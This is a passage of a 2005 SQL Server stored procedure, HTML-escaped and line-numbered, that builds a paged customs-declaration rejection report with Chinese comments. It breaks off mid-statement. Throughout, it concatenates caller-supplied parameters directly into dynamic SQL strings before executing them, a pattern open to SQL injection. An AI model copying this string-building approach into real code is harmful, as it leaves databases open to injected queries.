Input&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Output</p>\r\n\r\n<p>&nbsp;37**&nbsp;&nbsp;&nbsp;&nbsp; ----------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----------</p>\r\n\r\n<p>&nbsp;38**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>&nbsp;39**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Auth: chengdj</p>\r\n\r\n<p>&nbsp;40**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Date: 2005-4-7</p>\r\n\r\n<p>&nbsp;41*******************************************************************************</p>\r\n\r\n<p>&nbsp;42**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Change History</p>\r\n\r\n<p>&nbsp;43*******************************************************************************</p>\r\n\r\n<p>&nbsp;44**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Date:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Author:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Description:</p>\r\n\r\n<p>&nbsp;45**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --------&nbsp;&nbsp;&nbsp; --------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -------------------------------------------</p>\r\n\r\n<p>&nbsp;46**&nbsp;&nbsp;&nbsp; 2005-04-11&nbsp;&nbsp;&nbsp; chengdj&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add HgDiv function</p>\r\n\r\n<p>&nbsp;47**&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2005-04-11&nbsp;&nbsp;&nbsp; chengdj&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>&nbsp;48*******************************************************************************/</p>\r\n\r\n<p>&nbsp;49SET NOCOUNT ON</p>\r\n\r\n<p>&nbsp;50</p>\r\n\r\n<p>&nbsp;51declare @sqlWhere varchar(4000)</p>\r\n\r\n<p>&nbsp;52set @sqlWhere = &#39;&#39;</p>\r\n\r\n<p>&nbsp;53</p>\r\n\r\n<p>&nbsp;54set @TE_END_DATEEND = DATEADD(Day,1,@TE_END_DATEEND)&nbsp;&nbsp;&nbsp; --结束日期加一天&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>&nbsp;55set @sqlWhere = @sqlWhere + &#39; TE_END_DATE&nbsp; &gt;= &#39;&#39;&#39;+ CONVERT(varchar(20),@TE_END_DATE) +&#39;&#39;&#39; and TE_END_DATE &lt; &#39;&#39;&#39;+CONVERT(varchar(20),@TE_END_DATEEND)+&#39;&#39;&#39;&#39;</p>\r\n\r\n<p>&nbsp;56</p>\r\n\r\n<p>&nbsp;57if @TE_I_E_FLAG &lt;&gt; &#39;-2&#39;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ----进出口</p>\r\n\r\n<p>&nbsp;58&nbsp;&nbsp;&nbsp; set @sqlWhere = @sqlWhere + &#39; and TE_I_E_FLAG = &#39;&#39;&#39;+@TE_I_E_FLAG+&#39;&#39;&#39;&#39;</p>\r\n\r\n<p>&nbsp;59</p>\r\n\r\n<p>&nbsp;60if @TE_PASS_RANGE &lt;&gt; &#39;-2&#39;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --关区范围</p>\r\n\r\n<p>&nbsp;61&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set @sqlWhere = @sqlWhere + &#39; and TE_PASS_RANGE&nbsp; in ( SELECT a.GCL_CODE</p>\r\n\r\n<p>&nbsp;62FROM GL_CUSTOMER_LIST a CROSS JOIN</p>\r\n\r\n<p>&nbsp;63&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GL_CUSTOMER_LIST b</p>\r\n\r\n<p>&nbsp;64WHERE (a.GCL_LAYER LIKE b.GCL_LAYER + &#39;&#39;%&#39;&#39;) AND (b.GCL_CODE = &#39;&#39;&#39;+@TE_PASS_RANGE+&#39;&#39;&#39;)) &#39;</p>\r\n\r\n<p>&nbsp;65</p>\r\n\r\n<p>&nbsp;66/* if @TE_C_OUTPUT&lt;&gt; &#39;-2&#39;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --输出方式</p>\r\n\r\n<p>&nbsp;67&nbsp;&nbsp;&nbsp; set @sqlWhere = @sqlWhere + &#39;and &#39;</p>\r\n\r\n<p>&nbsp;68****************监控类型**********************/</p>\r\n\r\n<p>&nbsp;69</p>\r\n\r\n<p>&nbsp;70&nbsp;&nbsp;&nbsp; /*if @TE_MONI_T &lt;&gt; &#39;-2&#39;&nbsp;&nbsp;&nbsp; --监控类型</p>\r\n\r\n<p>&nbsp;71&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if @TE_MONI_T = &#39;2&#39;</p>\r\n\r\n<p>&nbsp;72&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set @sqlWhere = @sqlWhere + &#39; AND&nbsp; TE_SCENE_FLAG = 1 &#39;</p>\r\n\r\n<p>&nbsp;73&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;74&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set @sqlWhere = @sqlWhere + &#39; AND&nbsp; TE_WORKER_FLAG&nbsp; =&nbsp; &#39; +@TE_MONI_T + &#39; &#39;*/</p>\r\n\r\n<p>&nbsp;75/*</p>\r\n\r\n<p>&nbsp;76CREATE TABLE #TG009(&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>&nbsp;77&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TE_PASS_RANGE VARCHAR(4) PRIMARY KEY NOT NULL,</p>\r\n\r\n<p>&nbsp;78&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MAN_CLE_COUNT int null,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --人工退单报关单总数</p>\r\n\r\n<p>&nbsp;79&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MAN_CLE_TOTAL int null,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --人工退单报关单总数</p>\r\n\r\n<p>&nbsp;80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MAN_CLE_PCT float null,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --人工退单率</p>\r\n\r\n<p>&nbsp;81&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ELC_CLE_COUNT int null,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --电子退单总数</p>\r\n\r\n<p>&nbsp;82&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ELC_CLE_TOTAL int null,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --电子退单总次数</p>\r\n\r\n<p>&nbsp;83&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MAN_MU_COUNT int null,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --多次人工退单报关单数</p>\r\n\r\n<p>&nbsp;84&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ELC_CLE_PCT float null,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --电子退单率--</p>\r\n\r\n<p>&nbsp;85&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RE_COUNT int null,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --现场拒单报关单总数--</p>\r\n\r\n<p>&nbsp;86&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RE_TOTAL int null,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --现场拒单报关单总次数--</p>\r\n\r\n<p>&nbsp;87&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RE_PCT float null,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --现场拒单报关单率--</p>\r\n\r\n<p>&nbsp;88&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MU_ELC_CEL_EXP float null,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --多次电子退单指数</p>\r\n\r\n<p>&nbsp;89&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MU_MAN_EXP float null,&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --多次人工退单指数</p>\r\n\r\n<p>&nbsp;90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MU_SEC_EXP float null&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --多次现场拒单指数</p>\r\n\r\n<p>&nbsp;91)</p>\r\n\r\n<p>&nbsp;92&nbsp;&nbsp;&nbsp; */</p>\r\n\r\n<p>&nbsp;93&nbsp;&nbsp;&nbsp; declare @sql varchar(8000)</p>\r\n\r\n<p>&nbsp;94&nbsp;&nbsp;&nbsp; declare @groupby varchar(50)</p>\r\n\r\n<p>&nbsp;95&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>&nbsp;96&nbsp;&nbsp;&nbsp; if @TE_C_OUTPUT&nbsp; = &#39;1&#39;&nbsp;&nbsp;&nbsp; --按申报单位</p>\r\n\r\n<p>&nbsp;97&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set @groupby = &#39;TE_AGENT_CODE&#39;</p>\r\n\r\n<p>&nbsp;98&nbsp;&nbsp;&nbsp; else&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --其它按关区</p>\r\n\r\n<p>&nbsp;99&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set @groupby = &#39;TE_PASS_RANGE&#39;</p>\r\n\r\n<p>100&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>101&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; declare @sql2 nvarchar(500)</p>\r\n\r\n<p>102&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set @sql2 = &#39;select @COUNT = count(distinct(&#39;+@groupby+&#39;)) from TG_ENTRY where &#39;+@sqlWhere</p>\r\n\r\n<p>103&nbsp;&nbsp;&nbsp; execute sp_executesql &nbsp;</p>\r\n\r\n<p>104&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @sql2,</p>\r\n\r\n<p>105&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; N&#39;@COUNT int output&#39;,</p>\r\n\r\n<p>106&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @TOTAL_COUNT output</p>\r\n\r\n<p>107&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>108DECLARE @START_ID INT</p>\r\n\r\n<p>109DECLARE @END_ID INT</p>\r\n\r\n<p>110SET @START_ID = (@PAGE_NUMBER - 1) * 15 + 1</p>\r\n\r\n<p>111SET @END_ID = @PAGE_NUMBER * 15</p>\r\n\r\n<p>112&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>113&nbsp;&nbsp;&nbsp;&nbsp; ----</p>\r\n\r\n<p>114&nbsp;&nbsp;&nbsp;&nbsp; ----</p>\r\n\r\n<p>115&nbsp;&nbsp;&nbsp;&nbsp; -----&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>116&nbsp;&nbsp;&nbsp;&nbsp; if @TE_MONI_T = &#39;1&#39;&nbsp;&nbsp;&nbsp; --人工退单</p>\r\n\r\n<p>117&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set @sql = &#39;</p>\r\n\r\n<p>118&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; select top &#39;+convert(varchar(20),@END_ID)+ &#39; &#39;+ @groupby +&#39;,IDENTITY(int,1,1) AS TID into #PAGE&nbsp; from TG_ENTRY where &#39;+@sqlWhere +&#39; group by &#39;+@groupby+ &#39;;</p>\r\n\r\n<p>119&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CREATE TABLE #TG009(&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>120&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#39;+ @groupby+&#39; VARCHAR(10) PRIMARY KEY NOT NULL,</p>\r\n\r\n<p>121&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MAN_CLE_COUNT int null,&nbsp;&nbsp;&nbsp; &nbsp;</p>\r\n\r\n<p>122&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MAN_CLE_TOTAL int null,</p>\r\n\r\n<p>123&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MAN_CLE_PCT numeric(10,2) null,</p>\r\n\r\n<p>124&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MU_MAN_EXP numeric(10,2) null,</p>\r\n\r\n<p>125&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MAN_CLE_TOTAL1 int null,</p>\r\n\r\n<p>126&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MAN_CLE_TOTAL2 int null,</p>\r\n\r\n<p>127&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MAN_CLE_TOTAL3 int null</p>\r\n\r\n<p>128&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; );</p>\r\n\r\n<p>129</p>\r\n\r\n<p>130&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SELECT &#39;+ @groupby+&#39;,TE_CANCEL_FLAG,TE_WORKER_FLAG,TE_END_FLAG,TE_CANCEL_TIME INTO #temp1 FROM TG_ENTRY where&#39;+@sqlWhere+&#39; AND &#39;+@groupby+&#39; in ( select&nbsp; &#39;+ @groupby +&#39; from #PAGE where TID between &#39;+ convert(varchar(20),@START_ID)+ &#39; AND &#39;+ convert(varchar(20),@END_ID)+&#39;);</p>\r\n\r\n<p>131&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; INSERT INTO #TG009(</p>\r\n\r\n<p>132&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &#39;+ @groupby+&#39;,</p>\r\n\r\n<p>133&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MAN_CLE_COUNT,</p>\r\n\r\n<p>134&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MAN_CLE_TOTAL,</p>\r\n\r\n<p>135&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MAN_CLE_PCT,</p>\r\n\r\n<p>136&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MU_MAN_EXP,</p>\r\n\r\n<p>137&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MAN_CLE_TOTAL1,</p>\r\n\r\n<p>138&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MAN_CLE_TOTAL2,</p>\r\n\r\n<p>139&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MAN_CLE_TOTAL3) &nbsp;</p>\r\n\r\n<p>140&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SELECT a.&#39;+ @groupby+&#39;,</p>\r\n\r\n<p>141&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SELECT COUNT(*) FROM #temp1 WHERE TE_CANCEL_FLAG = 1 AND TE_WORKER_FLAG = 1 and &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;),</p>\r\n\r\n<p>142&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SELECT SUM(TE_CANCEL_TIME) FROM #temp1 WHERE TE_CANCEL_FLAG = 1 AND TE_WORKER_FLAG = 1 and &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;),</p>\r\n\r\n<p>143&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; risk.HgDiv((SELECT COUNT(*) FROM #temp1 WHERE TE_CANCEL_FLAG = 1 AND TE_WORKER_FLAG = 1 and &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;),(SELECT COUNT(*) FROM #temp1 WHERE TE_END_FLAG = 1 AND TE_WORKER_FLAG = 1 and &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;)),</p>\r\n\r\n<p>144&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; risk.HgDiv((SELECT SUM(TE_CANCEL_TIME) FROM #temp1 WHERE TE_CANCEL_FLAG = 1 AND TE_WORKER_FLAG = 0&nbsp; and &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;),(SELECT COUNT(*) FROM #temp1 WHERE TE_CANCEL_FLAG = 1 AND TE_WORKER_FLAG = 0&nbsp; and &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;)),</p>\r\n\r\n<p>145&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SELECT COUNT(*) FROM #temp1 WHERE TE_CANCEL_FLAG = 1 AND TE_WORKER_FLAG = 1 AND TE_CANCEL_TIME = 1 AND &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;),</p>\r\n\r\n<p>146&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SELECT COUNT(*) FROM #temp1 WHERE TE_CANCEL_FLAG = 1 AND TE_WORKER_FLAG = 1 AND TE_CANCEL_TIME = 2 AND &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;),</p>\r\n\r\n<p>147&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (SELECT COUNT(*) FROM #temp1 WHERE TE_CANCEL_FLAG = 1 AND TE_WORKER_FLAG = 1 AND TE_CANCEL_TIME &gt; 2 AND &#39;+ @groupby+&#39; =a.&#39;+ @groupby+&#39;)</p>\r\n\r\n<p>148&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; from #temp1 a</p>\r\n\r\n<p>149&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; group by a.&#39;+ @groupby+&#39;;</p>\r\n\r\n<p>150&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DROP TABLE #temp1;</p>\r\n\r\n<p>151&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SELECT * FROM #TG009;</p>\r\n\r\n<p>152&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DROP TABLE #TG009&#39;</p>\r\n\r\n<p>153&nbsp;&nbsp;&nbsp; else if&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @TE_MONI_T = &#39;0&#39;&nbsp;&nbsp;&nbsp; --电子</p>\r\n\r\n<p>154&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set @sql = &#39;</p>\r\n\r\n<p>155&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; select top &#39;+convert(varchar(20),@END_ID)+ &#39; &#39;+ @groupby +&#39;,IDENTITY(int,1,1) AS TID into #PAGE&nbsp; from TG_ENTRY where &#39;+@sqlWhere +&#39; group by &#39;+@groupby+ &#39;;</p>\r\n\r\n<p>156&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CREATE TABLE 